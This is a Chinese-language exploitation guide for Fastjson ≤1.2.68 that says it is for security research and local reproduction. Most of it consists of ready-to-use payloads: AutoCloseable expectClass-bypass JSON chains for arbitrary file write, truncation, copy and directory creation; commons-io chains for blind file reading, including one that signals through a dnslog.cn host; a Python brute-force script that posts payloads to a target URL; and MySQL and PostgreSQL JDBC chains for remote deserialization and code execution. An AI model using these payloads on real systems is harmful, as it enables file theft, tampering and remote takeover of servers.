---
title: ≤1.2.68 利用技巧
description: Fastjson ≤1.2.68 的 expectClass / AutoCloseable 绕过：JDK 写文件、commons-io 读写链、MysqlJdbc、PostgreSql
order: 2
---

# ≤1.2.68 利用技巧

本文分析 Fastjson **≤1.2.68** 利用：通过 `expectClass`（`java.lang.AutoCloseable` 实现类）绕过类型检查，配合 JDK / commons-io / JDBC 等依赖完成读写与反序列化。供安全研究与本地复现参考。

相关阅读：

- [≤1.2.80 利用技巧](/docs/fastjson-1.2.80)
- [≤1.2.47 利用技巧](/docs/fastjson-1.2.47)
- [1.2.83 利用技巧](/docs/fastjson-1.2.83)
- [Getter 触发技巧](/docs/getter-trigger)
- [写文件落地 RCE](/docs/writefile-rce)
- [期望类判断](/docs/fastjson-detect#4-期望类判断)
- [commons-io 任意文件读写](http://www.bmth666.cn/2025/12/30/Fastjson-commons-io%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/)

---

## 1. 绕过分析

核心是 **expectClass** 绕过：找 `java.lang.AutoCloseable` 的实现类。

设置 `@type` 且进入 `JavaBeanDeserializer` 时，会将**第一个** `@type` 作为 `expectClass`，再去检查**下一个** `@type`，从而绕过黑名单：

```json
{
  "@type": "java.lang.AutoCloseable",
  "@type": "<AutoCloseable 实现类>",
  ...
}
```

无参构造缺失时，若其它构造函数保留了**符号信息**（参数名），Fastjson 仍可按参数名匹配调用。标准 `javac` 编译常把参数名丢成 `arg0` / `var0`；「符号信息」指字节码 `LocalVariableTable` 中保留了真实参数名。可用：

```bash
javap -l <class_name> | grep LocalVariableTable
```

有输出则说明参数名可用。

---

## 2. 修复分析

后续版本将 `AutoCloseable` 列入黑名单，**不再作为 expectClass**，本节双重 `@type` 绕过失效。因此 payload 适用于 **≤1.2.68**。

---

## 3. JDK11 任意写 / 文件清空

### 3.1 任意写

依赖 `sun.rmi.server.MarshalOutputStream` + `InflaterOutputStream` + `FileOutputStream`：

```json
{
  "@type": "java.lang.AutoCloseable",
  "@type": "sun.rmi.server.MarshalOutputStream",
  "out": {
    "@type": "java.util.zip.InflaterOutputStream",
    "out": {
      "@type": "java.io.FileOutputStream",
      "file": "${file}",
      "append": false
    },
    "infl": {
      "input": {
        "array": "${array}",
        "limit": ${limit}
      }
    },
    "bufLen": "100"
  },
  "protocolVersion": 1
}
```

### 3.2 文件清空

构造 `FileOutputStream` / `FileWriter` 并以 `append: false` 打开即可截断：

```json
{
  "@type": "java.lang.AutoCloseable",
  "@type": "java.io.FileOutputStream",
  "file": "/tmp/123",
  "append": false
}
```

```json
{
  "@type": "java.lang.AutoCloseable",
  "@type": "java.io.FileWriter",
  "file": "/tmp/nonexist",
  "append": "false"
}
```

### 3.3 文件复制

需要 **aspectjtools** 依赖：

```json
{
  "@type": "java.lang.AutoCloseable",
  "@type": "org.eclipse.core.internal.localstore.SafeFileOutputStream",
  "targetPath": "/x/x/web/nonexist.txt",
  "tempPath": "/etc/hosts"
}
```

---

## 4. commons-io 利用概览

不同 **commons-io** 版本构造参数名不同，需按依赖改 payload。参考：[Fastjson commons-io 任意文件读写](http://www.bmth666.cn/2025/12/30/Fastjson-commons-io%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99/)。

| 注意点 | 说明 |
|--------|------|
| io &lt; 2.5 | 按系统可能命中带 `decoder` 的 `WriterOutputStream` 构造；`decoder` 只能是 `com.alibaba.fastjson.util.UTF8Decoder`，导致**无法写二进制**。相关讨论见 [Java-Puzzle / Fastjson Decoder](https://github.com/cwkiller/Java-Puzzle/tree/main/Fastjson%20Decoder) |
| 写文件大小 | 多数链只能写 **8KB 整**；io5 / ioFinal 等可突破 |
| 二进制 | 常用 `iso-8859-1` 编码；部分链需 Base64 |

---

## 5. commons-io 读文件 / 目录

由浅蓝对 BlackHat 链优化。场景说明见：[b1ue.cn](https://b1ue.cn/archives/506.html)。

读取错误时返回 `null`，需结合**原本就有回显**的点；报错读更常用。

### 5.1 回显读

```json
{
  "abc": {
    "@type": "java.lang.AutoCloseable",
    "@type": "org.apache.commons.io.input.BOMInputStream",
    "delegate": {
      "@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": {
        "@type": "jdk.nashorn.api.scripting.URLReader",
        "url": "file:///tmp/"
      },
      "charsetName": "UTF-8",
      "bufferSize": 1024
    },
    "boms": [
      {
        "@type": "org.apache.commons.io.ByteOrderMark",
        "charsetName": "UTF-8",
        "bytes": [ ... ]
      }
    ]
  },
  "address": { "$ref": "$.abc.BOM" }
}
```

### 5.2 报错读

内容匹配时抛错，不匹配则不报错（逐字节爆破常用）：

```json
{
  "abc": {
    "@type": "java.lang.AutoCloseable",
    "@type": "org.apache.commons.io.input.BOMInputStream",
    "delegate": {
      "@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": {
        "@type": "jdk.nashorn.api.scripting.URLReader",
        "url": "file:///tmp/test"
      },
      "charsetName": "UTF-8",
      "bufferSize": 1024
    },
    "boms": [
      {
        "@type": "org.apache.commons.io.ByteOrderMark",
        "charsetName": "UTF-8",
        "bytes": [98]
      }
    ]
  },
  "address": {
    "@type": "java.lang.AutoCloseable",
    "@type": "org.apache.commons.io.input.CharSequenceReader",
    "charSequence": {
      "@type": "java.lang.String"
      { "$ref": "$.abc.BOM[0]" },
      "start": 0,
      "end": 0
    }
  }
}
```

### 5.3 DNS 读

错误时有 DNS 请求，正确时没有：

```json
{
  "abc": {
    "@type": "java.lang.AutoCloseable",
    "@type": "org.apache.commons.io.input.BOMInputStream",
    "delegate": {
      "@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": {
        "@type": "jdk.nashorn.api.scripting.URLReader",
        "url": "file:///tmp/test"
      },
      "charsetName": "UTF-8",
      "bufferSize": 1024
    },
    "boms": [
      {
        "@type": "org.apache.commons.io.ByteOrderMark",
        "charsetName": "UTF-8",
        "bytes": [98]
      }
    ]
  },
  "address": {
    "@type": "java.lang.AutoCloseable",
    "@type": "org.apache.commons.io.input.CharSequenceReader",
    "charSequence": {
      "@type": "java.lang.String"
      { "$ref": "$.abc.BOM[0]" },
      "start": 0,
      "end": 0
    }
  },
  "xxx": {
    "@type": "java.lang.AutoCloseable",
    "@type": "org.apache.commons.io.input.BOMInputStream",
    "delegate": {
      "@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": {
        "@type": "jdk.nashorn.api.scripting.URLReader",
        "url": "http://aaaxasd.g2pbiw.dnslog.cn/"
      },
      "charsetName": "UTF-8",
      "bufferSize": 1024
    },
    "boms": [
      {
        "@type": "org.apache.commons.io.ByteOrderMark",
        "charsetName": "UTF-8",
        "bytes": [1]
      }
    ]
  },
  "zzz": { "$ref": "$.xxx.BOM[0]" }
}
```

### 5.4 配套爆破脚本（报错读）

码表可按目标改（JDK 路径多为小写；也可只用小写或全可见字符）：

```python
import requests

url = "http://192.168.1.101/login"

# asciis = [10,32,45,46,47,48,49,50,51,52,53,54,55,56,57,91,92,95,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122]  # linux 小写
asciis = [10,32,45,46,47,48,49,50,51,52,53,54,55,56,57,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,95,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122]  # 含大小写
# asciis = list(range(10, 127))  # 可见字符

data1 = """
{
    "abc": {
        "@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.BOMInputStream",
        "delegate": {
            "@type": "org.apache.commons.io.input.ReaderInputStream",
            "reader": {
                "@type": "jdk.nashorn.api.scripting.URLReader",
                "url": "file:///usr/local/tomcat/"
            },
            "charsetName": "UTF-8",
            "bufferSize": 1024
        },
        "boms": [
            {
                "charsetName": "UTF-8",
                "bytes": [
"""

data2 = """
                ]
            }
        ]
    },
    "address": {
        "@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.CharSequenceReader",
        "charSequence": {
            "@type": "java.lang.String"
            {"$ref":"$.abc.BOM[0]"},
            "start": 0,
            "end": 0
        }
    }
}
"""

proxies = {"http": "127.0.0.1:8080"}
header = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/json; charset=utf-8",
}

def byte2str(file_byte):
    print("【" + "".join(chr(int(i)) for i in file_byte) + "】")

file_byte = []
for _ in range(0, 50):  # 长度自定，建议分段
    for i in asciis:
        file_byte.append(str(i))
        req = requests.post(
            url=url,
            data=data1 + ",".join(file_byte) + data2,
            headers=header,
        )
        if "charSequence" not in req.text:
            file_byte.pop()
    byte2str(file_byte)
print(file_byte)
```

---

## 6. io1 / io2 写文件（编码后支持二进制）

参考：[微信文章](https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg)。

限制：只能写 **8KB 整**；二进制须 **iso-8859-1**；目录必须已存在。链路经 `XmlStreamReader` 构造触发 `getBOM`；ioFinal 会改成直接 `BOMInputStream.getBOM`，`FileWriterWithEncoding` 也会换成可建目录的 `LockableFileWriter`。

### 6.1 commons-io 2.0 – 2.6

```json
{
  "x": {
    "@type": "com.alibaba.fastjson.JSONObject",
    "input": {
      "@type": "java.lang.AutoCloseable",
      "@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": {
        "@type": "org.apache.commons.io.input.CharSequenceReader",
        "charSequence": {"@type": "java.lang.String""${content}"
      },
      "charsetName": "UTF-8",
      "bufferSize": 1024
    },
    "branch": {
      "@type": "java.lang.AutoCloseable",
      "@type": "org.apache.commons.io.output.WriterOutputStream",
      "writer": {
        "@type": "org.apache.commons.io.output.FileWriterWithEncoding",
        "file": "${path}",
        "encoding": "UTF-8",
        "append": false
      },
      "charsetName": "UTF-8",
      "bufferSize": 1024,
      "writeImmediately": true
    },
    "trigger": {
      "@type": "java.lang.AutoCloseable",
      "@type": "org.apache.commons.io.input.XmlStreamReader",
      "is": {
        "@type": "org.apache.commons.io.input.TeeInputStream",
        "input": { "$ref": "$.input" },
        "branch": { "$ref": "$.branch" },
        "closeBranch": true
      },
      "httpContentType": "text/xml",
      "lenient": false,
      "defaultEncoding": "UTF-8"
    },
    "trigger2": {
      "@type": "java.lang.AutoCloseable",
      "@type": "org.apache.commons.io.input.XmlStreamReader",
      "is": {
        "@type": "org.apache.commons.io.input.TeeInputStream",
        "input": { "$ref": "$.input" },
        "branch": { "$ref": "$.branch" },
        "closeBranch": true
      },
      "httpContentType": "text/xml",
      "lenient": false,
      "defaultEncoding": "UTF-8"
    },
    "trigger3": {
      "@type": "java.lang.AutoCloseable",
      "@type": "org.apache.commons.io.input.XmlStreamReader",
      "is": {
        "@type": "org.apache.commons.io.input.TeeInputStream",
        "input": { "$ref": "$.input" },
        "branch": { "$ref": "$.branch" },
        "closeBranch": true
      },
      "httpContentType": "text/xml",
      "lenient": false,
      "defaultEncoding": "UTF-8"
    }
  }
}
```

### 6.2 commons-io 2.7 – 2.8.0

参数名变化：`FileWriterWithEncoding` 用 `charsetName`；`XmlStreamReader` 用 `inputStream`。内容长度需 **&gt; 8192**，实际写入前 8192 字符：

```json
{
  "x": {
    "@type": "com.alibaba.fastjson.JSONObject",
    "input": {
      "@type": "java.lang.AutoCloseable",
      "@type": "org.apache.commons.io.input.ReaderInputStream",
      "reader": {
        "@type": "org.apache.commons.io.input.CharSequenceReader",
        "charSequence": {"@type": "java.lang.String""aaaaaa...(长度要大于8192，实际写入前8192个字符)",
        "start": 0,
        "end": 2147483647
      },
      "charsetName": "UTF-8",
      "bufferSize": 1024
    },
    "branch": {
      "@type": "java.lang.AutoCloseable",
      "@type": "org.apache.commons.io.output.WriterOutputStream",
      "writer": {
        "@type": "org.apache.commons.io.output.FileWriterWithEncoding",
        "file": "/tmp/pwned",
        "charsetName": "UTF-8",
        "append": false
      },
      "charsetName": "UTF-8",
      "bufferSize": 1024,
      "writeImmediately": true
    },
    "trigger": {
      "@type": "java.lang.AutoCloseable",
      "@type": "org.apache.commons.io.input.XmlStreamReader",
      "inputStream": {
        "@type": "org.apache.commons.io.input.TeeInputStream",
        "input": { "$ref": "$.input" },
        "branch": { "$ref": "$.branch" },
        "closeBranch": true
      },
      "httpContentType": "text/xml",
      "lenient": false,
      "defaultEncoding": "UTF-8"
    },
    "trigger2": {
      "@type": "java.lang.AutoCloseable",
      "@type": "org.apache.commons.io.input.XmlStreamReader",
      "inputStream": {
        "@type": "org.apache.commons.io.input.TeeInputStream",
        "input": { "$ref": "$.input" },
        "branch": { "$ref": "$.branch" },
        "closeBranch": true
      },
      "httpContentType": "text/xml",
      "lenient": false,
      "defaultEncoding": "UTF-8"
    },
    "trigger3": {
      "@type": "java.lang.AutoCloseable",
      "@type": "org.apache.commons.io.input.XmlStreamReader",
      "inputStream": {
        "@type": "org.apache.commons.io.input.TeeInputStream",
        "input": { "$ref": "$.input" },
        "branch": { "$ref": "$.branch" },
        "closeBranch": true
      },
      "httpContentType": "text/xml",
      "lenient": false,
      "defaultEncoding": "UTF-8"
    }
  }
}
```

### 6.3 解析特性（`java.lang.String` 特殊写法）

payload 中常见：

```json
"charSequence":{"@type":"java.lang.String""aaaaaa"
```

要点：

1. **不能**写成 `"charSequence": "aaa"`：`charSequence` 按接口当 JavaBean 处理，普通字符串类型不匹配。
2. `"@type":"java.lang.String"` **后面直接跟字符串字面量**（中间无逗号）；跟了逗号会进 `StringCodec` 的 default 分支报错。写成 `"original":"..."` 调构造也通常失败。
3. 末尾少一个 `}` 仍可能解析成功——记住这种写法即可。

---

## 7. io3 写文件（≈ io1 / io2）

[su18](https://su18.org/post/fastjson-1.2.68/) 发现的类似 io1 的链，结构与限制基本一致。

---

## 8. io4 写文件（支持二进制）

依赖：**commons-io-2.2**、**aspectjtools-1.9.6**、**commons-codec-1.6**。只能写 8KB 整，二进制正常。

公开于 BlackHat：[US-21-Xing](https://i.blackhat.com/USA21/Wednesday-Handouts/US-21-Xing-How-I-Used-a-JSON.pdf)；另见 [yanghaoi 整理](https://yanghaoi.github.io/2024/08/18/fastjson-lou-dong-chang-jian-wa-jue-he-li-yong-fang-fa/#toc-heading-32)。

模板要点：`Base64InputStream` + `SafeFileOutputStream`，`$ref` 触发 `$.bOM`：

```text
@type AutoCloseable → BOMInputStream
  delegate: TeeInputStream
    input: Base64InputStream(CharSequenceInputStream(cs=Base64内容))
    branch: SafeFileOutputStream(targetPath)
  boms: ByteOrderMark(bytes=填充后字节数组)
  x: $ref $.bOM
```

写入前将内容用 `a` 填充到超过 8192 再 Base64；`bytes` 填填充后字节数组的 `Arrays.toString` 形式。

---

## 9. io5 写文件 / 创建目录

在 io4 基础上用 **ant** 依赖替换 aspectjtools，可写 **8KB 以上**二进制。`LockableFileWriter` 可创建目录。参考：[微信文章](https://mp.weixin.qq.com/s/WbYi7lPEvFg-vAUB4Nlvew)。

### 9.1 目录创建

```json
{
  "@type": "java.lang.AutoCloseable",
  "@type": "org.apache.commons.io.output.WriterOutputStream",
  "writer": {
    "@type": "org.apache.commons.io.output.LockableFileWriter",
    "file": "/etc/passwd",
    "encoding": "UTF-8",
    "append": true,
    "lockDir": "/usr/lib/jvm/java-8-openjdk-amd64/jre/classes"
  },
  "charset": "UTF-8",
  "bufferSize": 8193,
  "writeImmediately": true
}
```

`file` 填已存在文件；`lockDir` 为要创建的目录。

### 9.2 任意文件写入

与 io4 同构，将 `SafeFileOutputStream` 换成：

```json
"branch": {
  "@type": "org.apache.tools.ant.util.LazyFileOutputStream",
  "file": "${path}",
  "append": false,
  "alwaysCreate": true
}
```

内容直接 Base64，无需强制 8KB 填充。

---

## 10. io6

```json
{
  "a": {
    "@type": "java.io.InputStream",
    "@type": "org.apache.commons.io.input.AutoCloseInputStream",
    "in": {
      "@type": "org.apache.commons.io.input.TeeInputStream",
      "input": {
        "@type": "org.apache.commons.io.input.CharSequenceInputStream",
        "cs": {
          "@type": "java.lang.String"
          "${shellcode}",
          "charset": "iso-8859-1",
          "bufferSize": ${size}
        },
        "branch": {
          "@type": "org.apache.commons.io.output.WriterOutputStream",
          "writer": {
            "@type": "org.apache.commons.io.output.LockableFileWriter",
            "file": "${file2write}",
            "charset": "iso-8859-1",
            "append": true
          },
          "charset": "iso-8859-1",
          "bufferSize": 1024,
          "writeImmediately": true
        },
        "closeBranch": true
      }
    }
  },
  "b": {
    "@type": "java.io.InputStream",
    "@type": "org.apache.commons.io.input.ReaderInputStream",
    "reader": {
      "@type": "org.apache.commons.io.input.XmlStreamReader",
      "inputStream": { "$ref": "$.a" },
      "httpContentType": "text/xml",
      "lenient": false,
      "defaultEncoding": "iso-8859-1"
    },
    "charsetName": "iso-8859-1",
    "bufferSize": 1024
  },
  "c": {}
}
```

---

## 11. io7

参考：[Currency 触发文章](https://mp.weixin.qq.com/s/7c_zi5Pv4a69IV0zzJo5Ww)。用 `java.util.Currency` 触发 getter：

```json
{
  "dd": {
    "@type": "java.util.Currency",
    "val": {
      "currency": {
        "w": {
          "@type": "java.lang.AutoCloseable",
          "@type": "org.apache.commons.io.input.BOMInputStream",
          "delegate": {
            "@type": "org.apache.commons.io.input.AutoCloseInputStream",
            "in": {
              "@type": "org.apache.commons.io.input.TeeInputStream",
              "input": {
                "@type": "org.apache.commons.io.input.CharSequenceInputStream",
                "cs": {
                  "@type": "java.lang.String"
                  "\xff",
                  "charset": "iso-8859-1",
                  "bufferSize": 1
                },
                "branch": {
                  "@type": "org.apache.commons.io.output.WriterOutputStream",
                  "writer": {
                    "@type": "org.apache.commons.io.output.LockableFileWriter",
                    "file": "/tmp/1.jpg",
                    "encoding": "iso-8859-1",
                    "charset": "iso-8859-1",
                    "append": false
                  },
                  "charset": "iso-8859-1",
                  "charsetName": "iso-8859-1",
                  "bufferSize": 1024,
                  "writeImmediately": true
                },
                "closeBranch": true
              }
            },
            "include": true,
          "boms": [
            {
              "@type": "org.apache.commons.io.ByteOrderMark",
              "charsetName": "iso-8859-1",
              "bytes": [0, 0, 0]
            }
          ]
        }
      }
    }
  }
}
```

---

## 12. ioFinal

可用 [java-chains](https://github.com/vulhub/java-chains) 等工具生成。改良点：直接通过 `BOMInputStream.getBOM` 触发；`LockableFileWriter` 自动建目录；`iso-8859-1` 写任意字节。

结构摘要：

```text
AutoCloseable → BOMInputStream
  delegate: AutoCloseInputStream → TeeInputStream
    input: ReaderInputStream(CharSequenceReader(String 字节内容), iso-8859-1)
    branch: WriterOutputStream(LockableFileWriter, iso-8859-1)
  include: true
  boms: ByteOrderMark(bytes 与内容等长的占位)
  x: $ref $.bOM
```

---

## 13. MysqlJdbc

相关背景可搜：mysql 驱动协议之 loadbalance 与 replication。

### 13.1 出网

**5.1.1 ~ 5.1.48：**

```json
{
  "x1": {
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.jdbc.JDBC4Connection",
    "hostToConnectTo": "127.0.0.1",
    "portToConnectTo": 3308,
    "info": {
      "user": "d6e26c4",
      "password": "pass",
      "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
      "autoDeserialize": "true",
      "NUM_HOSTS": "1"
    },
    "databaseToConnectTo": "test",
    "url": ""
  }
}
```

**6.0.2 / 6.0.3：**

```json
{
  "x1": {
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection",
    "proxy": {
      "connectionString": {
        "url": "jdbc:mysql://127.0.0.1:3308/test?user=d6e26c4&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"
      }
    }
  }
}
```

**≤ 8.0.19：**

```json
{
  "x1": {
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.cj.jdbc.ha.ReplicationMySQLConnection",
    "proxy": {
      "@type": "com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy",
      "connectionUrl": {
        "@type": "com.mysql.cj.conf.url.ReplicationConnectionUrl",
        "masters": [{}],
        "slaves": [],
        "properties": {
          "host": "127.0.0.1",
          "port": "3308",
          "user": "d6e26c4",
          "dbname": "test",
          "password": "pass",
          "queryInterceptors": "com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
          "autoDeserialize": "true"
        }
      }
    }
  }
}
```

8.0.19 从 `LoadBalancedConnectionProxy` 构造方法触发连接（经 `pickNewConnection` → `createConnectionForHost` → `setAutoCommit`）。

### 13.2 不出网（写 pipe + 本地加载）

需先写 pipe 文件再本地加载。参考：[mysql JDBC 绕过](https://1diot9.github.io/2025/05/05/mysql-JDBC-%E7%BB%95%E8%BF%87/)。

**5.1.1 ~ 5.1.48：**

```json
{
  "x1": {
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.jdbc.JDBC4Connection",
    "hostToConnectTo": "127.0.0.1",
    "portToConnectTo": 3306,
    "info": {
      "useSSL": "false",
      "user": "mysql",
      "HOST": "xxx",
      "statementInterceptors": "com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor",
      "autoDeserialize": "true",
      "NUM_HOSTS": "1",
      "socketFactory": "com.mysql.jdbc.NamedPipeSocketFactory",
      "namedPipePath": "/tmp/mysql.pcap",
      "DBNAME": "test"
    },
    "databaseToConnectTo": "test",
    "url": ""
  }
}
```

**6.0.2 / 6.0.3：**

```json
{
  "x1": {
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection",
    "proxy": {
      "connectionString": {
        "url": "jdbc:mysql://xxx/test?useSSL=false&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=mysql&socketFactory=com.mysql.cj.core.io.NamedPipeSocketFactory&namedPipePath=mysql"
      }
    }
  }
}
```

**≤ 8.0.19：**

```json
{
  "x1": {
    "@type": "java.lang.AutoCloseable",
    "@type": "com.mysql.cj.jdbc.ha.ReplicationMySQLConnection",
    "proxy": {
      "@type": "com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy",
      "connectionUrl": {
        "@type": "com.mysql.cj.conf.url.ReplicationConnectionUrl",
        "masters": [{}],
        "slaves": [],
        "properties": {
          "host": "xxx",
          "user": "mysql",
          "queryInterceptors": "com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor",
          "autoDeserialize": "true",
          "socketFactory": "com.mysql.cj.protocol.NamedPipeSocketFactory",
          "path": "/tmp/mysql.pcap",
          "maxAllowedPacket": "74996390",
          "dbname": "test",
          "useSSL": "false"
        }
      }
    }
  }
}
```

---

## 14. PostgreSql

可通过 `file` / `http` 加载 XML，配合 `ClassPathXmlApplicationContext`。

适用版本：

- `9.4.1208 ≤ org.postgresql:postgresql < 42.2.25`
- `42.3.0 ≤ org.postgresql:postgresql < 42.3.2`

```json
{
  "x1": {
    "@type": "java.lang.AutoCloseable",
    "@type": "org.postgresql.jdbc.PgConnection",
    "hostSpecs": [
      {
        "host": "127.0.0.1",
        "port": 2333
      }
    ],
    "user": "user",
    "database": "test",
    "info": {
      "socketFactory": "org.springframework.context.support.ClassPathXmlApplicationContext",
      "socketFactoryArg": "http://127.0.0.1:8080/bean.xml"
    },
    "url": ""
  }
}
```
